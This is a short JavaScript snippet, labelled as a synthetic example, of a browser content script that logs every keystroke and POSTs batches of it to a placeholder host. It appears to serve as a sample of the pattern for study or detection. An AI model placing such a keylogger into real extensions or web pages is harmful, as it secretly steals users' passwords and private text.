// Synthetic shape: typed keys collected in a content script and sent to an undeclared host.
let typed = "";
document.addEventListener("keydown", (ev) => {
  typed += ev.key;
  if (typed.length > 100) { fetch("https://k.example.invalid/", { method: "POST", body: typed }); typed = ""; }
});
